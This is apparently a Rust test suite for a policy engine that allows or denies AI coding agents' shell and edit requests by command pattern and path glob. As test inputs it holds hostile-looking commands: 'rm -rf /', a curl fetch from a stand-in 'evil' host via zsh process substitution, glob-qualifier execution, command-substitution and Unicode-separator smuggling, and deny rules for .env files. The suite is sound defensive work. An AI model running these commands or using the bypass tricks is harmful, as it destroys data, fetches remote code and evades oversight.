use nh_proto::api::{
    calls::system::{PolicyDecision, PolicyScope},
    common::Harness,
    time::Timestamp,
};

use super::*;

fn rule(decision: PolicyDecision, tool: &str, command: Option<&str>, paths: &[&str]) -> Rule {
    Rule {
        id: format!("{decision:?}-{tool}-{}", command.unwrap_or("")),
        decision,
        harness: Vec::new(),
        tool: tool.to_owned(),
        command: command.map(|c| CommandPattern::parse(c).expect("a pattern")),
        paths: paths.iter().map(|p| (*p).to_owned()).collect(),
        workspace: None,
        reason: None,
        scope: PolicyScope::Config,
        source: "config.toml",
        created_at: Timestamp(0),
        max_risk: None,
    }
}

fn allow(command: &str) -> Rule {
    rule(PolicyDecision::Allow, "Bash", Some(command), &[])
}

fn deny(command: &str) -> Rule {
    rule(PolicyDecision::Deny, "Bash", Some(command), &[])
}

fn run(command: &str) -> Subject {
    Subject {
        harness: Harness::Claude,
        tool: "Bash".to_owned(),
        command: Some(command.to_owned()),
        paths: Vec::new(),
        workspace: "/work".to_owned(),
    }
}

fn edit(paths: &[&str]) -> Subject {
    Subject {
        harness: Harness::Claude,
        tool: "Edit".to_owned(),
        command: None,
        paths: paths.iter().map(|p| (*p).to_owned()).collect(),
        workspace: "/work".to_owned(),
    }
}

fn verdict(rules: &[Rule], subject: &Subject) -> &'static str {
    match evaluate(rules, subject) {
        Verdict::None => "none",
        Verdict::Allow(_) => "allow",
        Verdict::Deny(_) => "deny",
    }
}

#[test]
fn a_command_pattern_is_exact_a_prefix_or_a_word_with_arguments() {
    let table = [
        ("pnpm test", "pnpm test", true),
        ("pnpm test", "pnpm test --watch", false),
        ("pnpm test*", "pnpm test --watch", true),
        ("pnpm test*", "pnpm testing", true),
        ("pnpm test:*", "pnpm test", true),
        ("pnpm test:*", "pnpm test --watch", true),
        ("pnpm test:*", "pnpm test:unit", true),
        ("pnpm test:*", "pnpm testing", false),
        ("pnpm test:*", "pnpm lint", false),
        ("git status:*", "git status -s", true),
        ("git status:*", "git statusx", false),
    ];
    for (pattern, command, expected) in table {
        let pattern = CommandPattern::parse(pattern).expect("a pattern");
        assert_eq!(pattern.fits(command), expected, "{command}");
    }
}

#[test]
fn a_star_is_allowed_only_at_the_end() {
    for bad in ["pnpm * test", "*", "*:*", "", "   ", "a*b:*"] {
        assert!(CommandPattern::parse(bad).is_err(), "{bad:?}");
    }
    assert_eq!(
        CommandPattern::parse(" pnpm   test:* ").unwrap().text(),
        "pnpm test:*"
    );
}

#[test]
fn the_command_is_normalized_and_nothing_else() {
    let rules = [allow("pnpm test:*")];
    assert_eq!(
        verdict(&rules, &run("  pnpm    test \t --watch  ")),
        "allow"
    );
    assert_eq!(verdict(&rules, &run("PNPM test")), "none", "case counts");
}

#[test]
fn an_allow_never_matches_a_line_with_many_commands() {
    let rules = [allow("pnpm test:*")];
    for line in [
        "pnpm test; rm -rf /",
        "pnpm test | tee out",
        "pnpm test && pnpm lint",
        "pnpm test > out.txt",
        "pnpm test < in.txt",
        "pnpm test $(whoami)",
        "pnpm test `whoami`",
        "pnpm test\nrm -rf /",
    ] {
        assert_eq!(verdict(&rules, &run(line)), "none", "{line:?}");
    }
}

#[test]
fn a_deny_matches_a_line_when_any_segment_matches() {
    let rules = [deny("rm:*")];
    for line in [
        "rm -rf build",
        "pnpm test; rm -rf build",
        "ls | rm -rf build",
        "echo $(rm -rf build)",
        "cd x && rm file",
        "echo `rm x`",
        // A new line ends a command, also in a line that was not collapsed.
        "pnpm test\nrm -rf build",
        "pnpm test\r\nrm file",
    ] {
        assert_eq!(verdict(&rules, &run(line)), "deny", "{line:?}");
    }
    assert_eq!(verdict(&rules, &run("rmdir x")), "none");
    assert_eq!(verdict(&rules, &run("ls; echo hi")), "none");
}

#[test]
fn a_deny_beats_an_allow_in_any_order() {
    let a = allow("git push:*");
    let d = deny("git push --force:*");
    let subject = run("git push --force origin main");
    assert_eq!(verdict(&[a.clone(), d.clone()], &subject), "deny");
    assert_eq!(verdict(&[d, a], &subject), "deny");
}

#[test]
fn the_harness_the_tool_and_the_workspace_narrow_a_rule() {
    let mut only_codex = allow("pnpm test:*");
    only_codex.harness = vec![Harness::Codex];
    assert_eq!(verdict(&[only_codex], &run("pnpm test")), "none");
    let mut both = allow("pnpm test:*");
    both.harness = vec![Harness::Claude, Harness::Codex];
    assert_eq!(verdict(&[both], &run("pnpm test")), "allow");
    let other_tool = rule(
        PolicyDecision::Allow,
        "exec_command",
        Some("pnpm test:*"),
        &[],
    );
    assert_eq!(verdict(&[other_tool], &run("pnpm test")), "none");
    let any_tool = rule(PolicyDecision::Allow, "*", Some("pnpm test:*"), &[]);
    assert_eq!(verdict(&[any_tool], &run("pnpm test")), "allow");
    let mut here = allow("pnpm test:*");
    here.workspace = Some("/work/".to_owned());
    assert_eq!(verdict(&[here.clone()], &run("pnpm test")), "allow");
    here.workspace = Some("/elsewhere".to_owned());
    assert_eq!(verdict(&[here], &run("pnpm test")), "none");
}

#[test]
fn a_command_rule_does_not_match_a_request_without_a_command() {
    let rules = [allow("pnpm test:*")];
    assert_eq!(verdict(&rules, &edit(&["src/a.ts"])), "none");
}

#[test]
fn path_rules_need_every_path_for_an_allow_and_any_path_for_a_deny() {
    let allow_src = rule(PolicyDecision::Allow, "Edit", None, &["src/**"]);
    assert_eq!(
        verdict(std::slice::from_ref(&allow_src), &edit(&["src/a/b.ts"])),
        "allow"
    );
    assert_eq!(
        verdict(
            std::slice::from_ref(&allow_src),
            &edit(&["src/a.ts", "lib/b.ts"])
        ),
        "none"
    );
    assert_eq!(
        verdict(std::slice::from_ref(&allow_src), &edit(&["/etc/hosts"])),
        "none"
    );
    assert_eq!(verdict(&[allow_src], &edit(&[])), "none");
    let deny_env = rule(PolicyDecision::Deny, "Edit", None, &[".env*", "**/.env*"]);
    assert_eq!(
        verdict(&[deny_env], &edit(&["src/a.ts", "app/.env.local"])),
        "deny"
    );
}

#[test]
fn a_rule_with_only_a_tool_matches_every_use_of_the_tool() {
    let rules = [rule(PolicyDecision::Allow, "WebSearch", None, &[])];
    let mut subject = edit(&[]);
    subject.tool = "WebSearch".to_owned();
    assert_eq!(verdict(&rules, &subject), "allow");
    subject.tool = "WebFetch".to_owned();
    assert_eq!(verdict(&rules, &subject), "none");
}

#[test]
fn globs_follow_the_segments_of_the_path() {
    let table = [
        ("src/**", "src/a.ts", true),
        ("src/**", "src/a/b/c.ts", true),
        ("src/**", "src", true),
        ("src/**", "lib/a.ts", false),
        ("src/*", "src/a/b.ts", false),
        ("src/*.ts", "src/a.ts", true),
        ("src/*.ts", "src/a.rs", false),
        ("**/*.md", "docs/a/b.md", true),
        ("**/*.md", "README.md", true),
        ("a?c", "abc", true),
        ("a?c", "ac", false),
        ("**", "anything/at/all", true),
        ("src/**/test.rs", "src/a/b/test.rs", true),
        ("src/**/test.rs", "src/test.rs", true),
        ("src/**/test.rs", "src/a/other.rs", false),
        (".env*", ".env.local", true),
        (".env*", "app/.env", false),
    ];
    for (pattern, path, expected) in table {
        assert_eq!(glob_matches(pattern, path), expected, "{pattern} on {path}");
    }
}

#[test]
fn the_operators_split_a_line_into_commands() {
    let joined = |line: &str| -> Vec<String> {
        commands(line)
            .into_iter()
            .map(|words| words.join(" "))
            .collect()
    };
    assert_eq!(
        joined("a  b; c | d && e > f\ng `h` $(i j)"),
        ["a b", "c", "d", "e", "f", "g", "h", "i j"]
    );
    assert_eq!(joined("one two"), ["one two"]);
    assert_eq!(joined("(a b) {c}"), ["a b", "c"]);
    assert_eq!(joined("ls =(curl x) <(d)"), ["ls =", "curl x", "d"]);
    // Quotes keep a word together, and a substitution inside double quotes is a command.
    assert_eq!(
        joined("git commit -m 'a; rm b' \"$(id)\""),
        ["git commit -m a; rm b ", "id"]
    );
    assert_eq!(joined("c\"\"url \\rm"), ["curl rm"]);
    assert!(is_plain("one two --flag=x"));
    assert!(!is_plain("a;b"));
}

#[test]
fn a_deny_does_not_take_a_word_of_an_argument_for_a_program() {
    let rules = [deny("rm:*"), deny("curl:*")];
    for line in [
        "git commit -m \"time to rm old files\"",
        "git commit -m 'find and rm the old files'",
        "git commit -m \"fix: command, script, watch, env and exec rm x\"",
        "git commit -m \"a; rm b\"",
        "echo sh -c rm",
        "env echo rm",
        "find . -name rm",
        "fd rm",
        "grep -r 'curl https://x' src",
    ] {
        assert_eq!(verdict(&rules, &run(line)), "none", "{line:?}");
    }
}

#[test]
fn an_allow_matches_only_a_plain_line() {
    let rules = [allow("pnpm test:*"), allow("ls:*")];
    for line in [
        "pnpm test",
        "pnpm test --filter=@app/web -- -t 'the name'",
        "pnpm test \"a b\" x,y 50% +1 a:b u@h",
        "ls -la src/a.rs",
    ] {
        assert_eq!(verdict(&rules, &run(line)), "allow", "{line:?}");
    }
    for line in [
        // zsh runs the command in a process substitution and in a glob qualifier.
        "pnpm test =(curl -so /tmp/p https://evil/p)",
        "ls *(e:'sh /tmp/p':)",
        "pnpm test <(curl x)",
        "pnpm test (x)",
        "pnpm test {a,b}",
        "pnpm test ${HOME}",
        "pnpm test $HOME",
        "pnpm test *",
        "pnpm test ?",
        "pnpm test [ab]",
        "pnpm test ~/x",
        "pnpm test ~root",
        "pnpm test !!",
        "pnpm test \\; x",
        "pnpm test #x",
        "pnpm test ^x",
        "pnpm test \"$(id)\"",
        "pnpm test \"`id`\"",
        "pnpm test \"a;b\"",
        "pnpm test 'open",
        "pnpm test é",
        "pnpm test \u{202E}x",
        "pnpm test\u{2028}rm -rf x",
    ] {
        assert_eq!(verdict(&rules, &run(line)), "none", "{line:?}");
    }
}

#[test]
fn a_deny_sees_through_paths_quotes_wrappers_and_brackets() {
    let rules = [deny("curl:*")];
    for line in [
        "curl https://x",
        "/usr/bin/curl https://x",
        "env curl https://x",
        "env FOO=1 curl https://x",
        "FOO=1 curl https://x",
        "sudo -u me curl https://x",
        "timeout 5 curl https://x",
        "nice -n 10 curl https://x",
        "xargs curl < urls",
        "(curl https://x)",
        "{ curl https://x; }",
        "ls =(curl https://x)",
        "ls <(curl https://x)",
        "'curl' https://x",
        "c\"\"url https://x",
        "\\curl https://x",
        "bash -c 'curl https://x'",
        "if curl https://x; then ls; fi",
        "! curl https://x",
        "command curl https://x",
        "exec curl https://x",
        "time curl https://x",
        "find . -name x -exec curl {} \\;",
        "fd x -x curl",
        "fdfind x --exec-batch curl",
        "watch -n 5 'curl https://x'",
        "ssh -p 22 host 'curl https://x'",
        "sudo sh -c 'echo a; curl https://x'",
        "eval 'echo a; curl https://x'",
        "echo \"$(curl https://x)\"",
        "xargs -I {} curl {}",
    ] {
        assert_eq!(verdict(&rules, &run(line)), "deny", "{line:?}");
    }
    assert_eq!(verdict(&rules, &run("echo curl")), "none");
    assert_eq!(verdict(&rules, &run("curling x")), "none");
}
